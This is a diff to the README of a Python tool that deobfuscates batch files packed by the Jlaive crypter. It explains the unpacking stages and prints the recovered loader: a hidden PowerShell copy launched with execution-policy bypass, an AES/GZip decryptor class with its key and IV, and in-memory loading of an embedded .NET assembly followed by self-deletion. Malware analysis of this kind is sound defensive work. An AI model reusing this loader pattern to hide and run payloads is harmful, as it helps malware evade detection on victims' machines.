@@ -94,9 +94,8 @@ set "eZKAFlWkCV=MlVcdDTvXm"
 attrib -s -h "%~dp0%~nx0.exe"
 del "%~dp0%~nx0.exe"(goto) 2>nul & del "%~f0"
 exit /b
-jjNNb7+5GJxTidTZUiwqq6EMDNO1MKBC21fz5d08N7l -- a bunch more of b64 encrypted bytes ---
+-- a bunch of b64 encrypted bytes ---
 ```
-
 
 
 # Jlaive-Deobfuscator
@@ -112,6 +111,39 @@ So, here is my attempt of writing a script in python that:
 - Recovers all the .ps1 files created.
 - Recovers the keys, ivs and encrypted blocks and decrypts them, providing the intermediate .exe files.
 - Recovers the original executable before being converted to that obfuscated .bat file.
+
+## Deobfuscated .bat
+After running the script, the obfuscated batch file will now look like this:
+```powershell
+@echo off
+echo F|xcopy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "%~dp0%~nx0.exe" /y
+attrib +s +h "%~dp0%~nx0.exe"
+cls
+cd %~dp0
+rem https://github.com/ch2sh/Jlaive%~nx0.exe -noprofile -windowstyle hidden -executionpolicy bypass -command $aViIGz = [System.IO.File]::ReadAllText("%~f0").Split([Environment]::NewLine);$zMcEAF = $aViIGz[$aViIGz.Length - 1];$jqmXGf = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXNpbmcgU3lzdGVtLlRleHQ7dXNpbmcgU3lzdGVtLklPO3VzaW5nIFN5c3RlbS5JTy5Db21wcmVzc2lvbjt1c2luZyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5OyBwdWJsaWMgY2xhc3MgR2xUWVlFIHsgcHVibGljIHN0YXRpYyBieXRlW10gY1lKakRqKGJ5dGVbXSBpbnB1dCwgYnl0ZVtdIGtleSwgYnl0ZVtdIGl2KSB7IEFlc01hbmFnZWQgYWVzID0gbmV3IEFlc01hbmFnZWQoKTsgYWVzLk1vZGUgPSBDaXBoZXJNb2RlLkNCQzsgYWVzLlBhZGRpbmcgPSBQYWRkaW5nTW9kZS5QS0NTNzsgSUNyeXB0b1RyYW5zZm9ybSBkZWNyeXB0b3IgPSBhZXMuQ3JlYXRlRGVjcnlwdG9yKGtleSwgaXYpOyBieXRlW10gZGVjcnlwdGVkID0gZGVjcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soaW5wdXQsIDAsIGlucHV0Lkxlbmd0aCk7IGRlY3J5cHRvci5EaXNwb3NlKCk7IGFlcy5EaXNwb3NlKCk7IHJldHVybiBkZWNyeXB0ZWQ7IH0gcHVibGljIHN0YXRpYyBieXRlW10gUmJkSlJQKGJ5dGVbXSBieXRlcykgeyBNZW1vcnlTdHJlYW0gbXNpID0gbmV3IE1lbW9yeVN0cmVhbShieXRlcyk7IE1lbW9yeVN0cmVhbSBtc28gPSBuZXcgTWVtb3J5U3RyZWFtKCk7IHZhciBncyA9IG5ldyBHWmlwU3RyZWFtKG1zaSwgQ29tcHJlc3Npb25Nb2RlLkRlY29tcHJlc3MpOyBncy5Db3B5VG8obXNvKTsgZ3MuRGlzcG9zZSgpOyBtc2kuRGlzcG9zZSgpOyBtc28uRGlzcG9zZSgpOyByZXR1cm4gbXNvLlRvQXJyYXkoKTsgfSB9"));Add-Type -TypeDefinition $jqmXGf;[System.Reflection.Assembly]::Load([GlTYYE]::RbdJRP([GlTYYE]::cYJjDj([System.Convert]::FromBase64String($zMcEAF), [System.Convert]::FromBase64String("KsXDu/ZuLORpumzY7tRqieLJCAHO4HhkWSLGTa9vFUs="), [System.Convert]::FromBase64String("NP/92qw/SR3ausC7GbKhag==")))).EntryPoint.Invoke($null, (, [string[]] ("%*")))
+attrib -s -h "%~dp0%~nx0.exe"
+del "%~dp0%~nx0.exe"(goto) 2>nul & del "%~f0"
+exit /b
+-- a bunch of b64 encrypted bytes --
+```
+
+## Cs containing decryption,decompression
+Another file that will be generated will be the wzpaloqi.0.cs that contains the definition of a class created upon running the .bat and will look like this:
+```csharp
+using System.Text;using System.IO;using System.IO.Compression;using System.Security.Cryptography; public class GlTYYE { public static byte[] cYJjDj(byte[] input, byte[] key, byte[] iv) { AesManaged aes = new AesManaged(); aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7; ICryptoTransform decryptor = aes.CreateDecryptor(key, iv); byte[] decrypted = decryptor.TransformFinalBlock(input, 0, input.Length); decryptor.Dispose(); aes.Dispose(); return decrypted; } public static byte[] RbdJRP(byte[] bytes) { MemoryStream msi = new MemoryStream(bytes); MemoryStream mso = new MemoryStream(); var gs = new GZipStream(msi, CompressionMode.Decompress); gs.CopyTo(mso); gs.Dispose(); msi.Dispose(); mso.Dispose(); return mso.ToArray(); } }
+```
+
+## Loader stub
+The encrypted bytes after the exit /b command will create a .NET executable that is responsible for decrypting and decompressing the original executable (before being converted to the obfuscated .bat). The key and iv used for its decryption is used in the previously recovered files. After decrypting it, we get the loader_stub.exe which will look like this:  
+![image](https://github.com/connar/Jlaive-Deobfuscator/assets/87579399/68dabba2-120d-4923-a6de-dc02f6e736e0)
+
+## Original executable
+The previously decrypted exe was decrypting a payload.txt attached to its Resources. This will be the original executable given to the Jlaive engine.
+
+
+
+# Running the tool
+After running the tool, the output will be the following:
 
 
 # Dependencies
